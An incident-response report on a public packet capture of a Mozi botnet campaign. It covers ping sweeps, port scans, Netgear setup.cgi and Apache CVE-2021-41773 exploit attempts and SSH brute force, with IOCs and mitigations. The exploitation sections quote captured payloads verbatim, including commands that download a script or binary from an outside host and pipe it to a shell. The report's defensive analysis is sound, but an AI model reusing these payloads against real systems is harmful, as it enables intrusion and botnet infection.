# 🚨 Investigation: Mozi Botnet + Multi-Stage Attack Analysis

**Incident ID:** IR-003  
**Date:** December 13-18, 2024  
**Analyst:** Mohammed Faisal Jahangir  
**Severity:** HIGH  
**Status:** Contained — No successful compromise  
**Source:** malware-traffic-analysis.net PCAP  

---

## Executive Summary

Analysis of one week of server traffic (361,992 packets) revealed a coordinated multi-stage attack campaign targeting internet-facing servers. The attack included ICMP reconnaissance, Mozi botnet exploitation attempts, Apache CVE-2021-41773 path traversal, and SSH brute force. **All attacks failed** — no successful compromise was detected.

---

## Attack Timeline

```
STAGE 1 — RECONNAISSANCE
→ 203.161.44.208 sends 13,511 ICMP packets
→ Randomized destinations (evasion technique)
→ Mapping live hosts across IP ranges

STAGE 2 — PORT SCANNING  
→ 151,684 SYN packets to target
→ All 65,535 ports scanned
→ Port 22 (SSH) identified as open

STAGE 3 — WEB EXPLOITATION
→ Mozi botnet exploit attempted
→ Apache CVE-2021-41773 attempted
→ Self-replicating malware download attempted
→ All returned 404/Bad Request

STAGE 4 — BRUTE FORCE
→ 12,963 packets to port 22
→ SSH password brute force
→ No successful authentication
```

---

## Detailed Findings

### Stage 1 — ICMP Ping Sweep

**Wireshark Filter:**
```
icmp
```

**Findings:**
- Source: 203.161.44.208 (Namecheap/US — 2/94 VirusTotal)
- 13,511 ICMP Echo Request packets
- Randomized destinations — deliberate evasion
- Purpose: Identify live hosts before targeting

**Why Randomized?**
Sequential scanning (1.1.1.1 → 1.1.1.2 → 1.1.1.3) triggers IDS immediately. Random scanning appears as noise.

---

### Stage 2 — Port Scan

**Wireshark Filter:**
```
tcp.flags.syn == 1 && tcp.flags.ack == 0
```

**Findings:**
- 151,684 pure SYN packets
- All targeting 203.161.44.208
- Multiple source IPs from Asia Pacific region
- Port 22 (SSH) confirmed open

---

### Stage 3 — Mozi Botnet Exploit

**Raw Attack Payload:**
```http
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;
wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&
curpath=/&currentsetting.htm=1 HTTP/1.0
```

**Decoded:**
```bash
rm -rf /tmp/*                          # Clear temp directory
wget http://192.168.1.1:8088/Mozi.m   # Download Mozi malware
sh netgear                             # Execute immediately
```

**Target:** Netgear router setup.cgi vulnerability  
**Result:** HTTP 404 Not Found — attack failed  

---

### Stage 3b — Apache CVE-2021-41773

**Raw Attack Payload:**
```http
POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
Host: 203.161.44.208:80
User-Agent: Custom-AsyncHttpClient
Content-Type: text/plain

X=$(curl http://94.156.177.109/sh || wget http://94.156.177.109/sh -O-);
echo "$X" | sh -s apache.selfrep
```

**Decoded:**
```
%2e%2e = .. (directory traversal)
Path:   /cgi-bin/../../../../bin/sh
Goal:   Escape web directory → reach Linux shell
Then:   Download and execute self-replicating malware
```

**CVE:** CVE-2021-41773 — Apache HTTP Server path traversal  
**User-Agent:** Custom-AsyncHttpClient = automated attack tool  
**Result:** HTTP 404 Not Found — attack failed  

---

### Stage 4 — SSH Brute Force

**Wireshark Filter:**
```
tcp.dstport == 22 && ip.dst == 203.161.44.208
```

**Findings:**
- 12,963 packets to port 22
- Multiple source IPs (Asia Pacific range)
- No successful authentication detected

---

## IOC Master List

```
TYPE        VALUE                   SCORE    DETAILS
────────────────────────────────────────────────────────
IP          203.161.44.208          2/94     Primary attacker (Namecheap/US)
IP          94.156.177.109          11/94    Malware C2 server (Netherlands)
IP          120.85.92.194           0/94     Secondary attacker IP
IP          1.2.128.121             1/94     Port scanner (APAC)
IP          1.9.44.249              2/94     Port scanner (APAC)
FILE        Mozi.m                           IoT botnet malware binary
FILE        sh                               Self-replicating shell script
CVE         CVE-2021-41773                   Apache path traversal
STRING      todo=syscmd                      Netgear exploit signature
STRING      Custom-AsyncHttpClient           Attack tool user agent
STRING      apache.selfrep                   Self-replication flag
STRING      .%2e/.%2e/                       Path traversal signature
```

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Reconnaissance | Active Scanning: IP Blocks | T1595.001 | 13,511 ICMP packets |
| Reconnaissance | Network Service Scanning | T1046 | 151,684 SYN port scan |
| Initial Access | Exploit Public Application | T1190 | Apache CVE-2021-41773 |
| Initial Access | Exploit Public Application | T1190 | Netgear setup.cgi |
| C2 | Ingress Tool Transfer | T1105 | wget/curl Mozi.m download |
| C2 | Web Protocols | T1071.001 | HTTP C2 communication |
| Lateral Movement | Exploitation of Remote Services | T1210 | Island hopping pattern |
| Credential Access | Brute Force | T1110 | SSH brute force port 22 |
| Defense Evasion | Obfuscated Files | T1027 | URL encoding %2e%2e |

---

## Recommended Actions

```
IMMEDIATE:
→ Block 203.161.44.208 at firewall
→ Block 94.156.177.109 at firewall
→ Patch Apache to latest version (CVE-2021-41773)
→ Update all Netgear router firmware
→ Disable SSH password auth — use key pairs only

SHORT TERM:
→ Enable fail2ban for SSH brute force protection
→ Implement port knocking for SSH access
→ Deploy IDS rules for Mozi botnet signatures
→ Monitor for connections to 94.156.177.109

LONG TERM:
→ Regular vulnerability scanning schedule
→ Network segmentation for IoT devices
→ Zero trust architecture implementation
```

---

## Verdict

```
All 4 attack stages failed.
Network was NOT compromised.
No malware was successfully installed.
No data was exfiltrated.

Key protection factors:
→ Server was not a Netgear router (Mozi failed)
→ Apache was patched (CVE-2021-41773 failed)
→ SSH had strong passwords (brute force failed)
→ Network monitoring detected all activity
```
